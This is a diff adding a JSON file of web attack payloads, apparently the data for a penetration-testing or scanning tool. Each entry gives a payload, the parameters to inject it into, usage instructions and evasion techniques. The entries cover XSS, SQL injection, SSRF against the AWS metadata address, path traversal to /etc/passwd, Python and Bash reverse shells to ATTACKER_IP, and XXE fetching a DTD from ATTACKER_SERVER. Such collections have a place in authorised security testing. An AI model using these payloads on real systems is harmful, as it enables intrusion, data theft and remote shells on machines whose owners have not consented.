@@ -1,0 +1,165 @@
+[
+    {
+        "id": "xss_polyglot_context",
+        "name": "Context Breaking Polyglot",
+        "category": "XSS",
+        "risk": "Critical",
+        "description": "Polyglot XSS vector designed to break out of multiple contexts.",
+        "payload": "javascript://%250Aalert(1)//\" onerror=alert(1)//",
+        "target_parameters": [
+            "q",
+            "search",
+            "url"
+        ],
+        "usage_guide": "Inject into any reflection. Effective against weak sanitization.",
+        "evasion_techniques": [
+            "Context Confusion",
+            "Protocol Handling"
+        ]
+    },
+    {
+        "id": "sqli_universal_polyglot",
+        "name": "Universal SQLi Polyglot",
+        "category": "SQLi",
+        "risk": "High",
+        "description": "Combines multiple SQL injection techniques into one payload.",
+        "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+        "target_parameters": [
+            "id",
+            "user"
+        ],
+        "usage_guide": "Use for detection. If response delays, injection is successful.",
+        "evasion_techniques": [
+            "Comment Obfuscation",
+            "Quote Juggling"
+        ]
+    },
+    {
+        "id": "xss_basic_alert",
+        "name": "Basic XSS Alert",
+        "category": "XSS",
+        "risk": "High",
+        "description": "Standard script tag aiming to pop an alert box.",
+        "payload": "<script>alert(1)</script>",
+        "target_parameters": [
+            "q",
+            "search",
+            "id",
+            "name"
+        ],
+        "usage_guide": "Inject into reflection points. If unfiltered, an alert box will appear.",
+        "evasion_techniques": [
+            "URL Encoding",
+            "HTML Entities"
+        ]
+    },
+    {
+        "id": "ssrf_aws_meta",
+        "name": "AWS Metadata Extraction",
+        "category": "SSRF",
+        "risk": "Critical",
+        "description": "Attempts to reach the AWS link-local address for metadata.",
+        "payload": "http://169.254.169.254/latest/meta-data/",
+        "target_parameters": [
+            "url",
+            "link",
+            "src",
+            "target"
+        ],
+        "usage_guide": "Inject into URL-fetching parameters. Successful exploitation returns AWS instance data.",
+        "evasion_techniques": [
+            "Decimal IP Encoding",
+            "DNS Rebinding"
+        ]
+    },
+    {
+        "id": "sqli_union_select",
+        "name": "Union Based SQL Injection",
+        "category": "SQLi",
+        "risk": "Critical",
+        "description": "Classic UNION SELECT injection to retrieve data from other tables.",
+        "payload": "' UNION SELECT 1, database(), user(), 4 -- ",
+        "target_parameters": [
+            "id",
+            "user",
+            "cat"
+        ],
+        "usage_guide": "Use when error-based SQLi is suppressed but data is visible. Adjust column count until it works.",
+        "evasion_techniques": [
+            "Comment variations",
+            "Whitespace manipulation"
+        ]
+    },
+    {
+        "id": "lfi_etc_passwd",
+        "name": "Local File Inclusion (Linux)",
+        "category": "LFI",
+        "risk": "High",
+        "description": "Traverses directories to read the /etc/passwd file.",
+        "payload": "../../../../../../../../../etc/passwd",
+        "target_parameters": [
+            "file",
+            "page",
+            "include",
+            "view"
+        ],
+        "usage_guide": "Inject into file-loading parameters. Look for 'root:x:0:0' in the response.",
+        "evasion_techniques": [
+            "Null Byte Injection (%00)",
+            "Double URL Encoding"
+        ]
+    },
+    {
+        "id": "rce_reverse_shell_python",
+        "name": "Python Reverse Shell",
+        "category": "RCE",
+        "risk": "Critical",
+        "description": "Standard Python reverse shell one-liner for establishing remote access.",
+        "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+        "target_parameters": [
+            "cmd",
+            "exec",
+            "command"
+        ],
+        "usage_guide": "Use in Command Injection scenarios. Replace ATTACKER_IP with your listener IP.",
+        "evasion_techniques": [
+            "Base64 Encoding",
+            "Whitespace Obfuscation"
+        ]
+    },
+    {
+        "id": "rce_reverse_shell_bash",
+        "name": "Bash Reverse Shell",
+        "category": "RCE",
+        "risk": "Critical",
+        "description": "Classic Bash TCP reverse shell.",
+        "payload": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+        "target_parameters": [
+            "cmd",
+            "exec"
+        ],
+        "usage_guide": "Requires bash on the target. Extremely effective for Linux targets.",
+        "evasion_techniques": [
+            "Internal Field Separator (IFS)",
+            "Base64 Pipe"
+        ]
+    },
+    {
+        "id": "xxe_oob_exfil",
+        "name": "XXE OOB Exfiltration",
+        "category": "XXE",
+        "risk": "High",
+        "description": "XML External Entity injection designed to send data to an external server.",
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://ATTACKER_SERVER/malicious.dtd\">]><foo>&xxe;</foo>",
+        "target_parameters": [
+            "xml",
+            "data",
+            "api"
+        ],
+        "usage_guide": "Inject into XML parsers. Requires an external DTD hosted on your server.",
+        "evasion_techniques": [
+            "Parameter Entities",
+            "Encoding (UTF-16)"
+        ]
+    }
+]
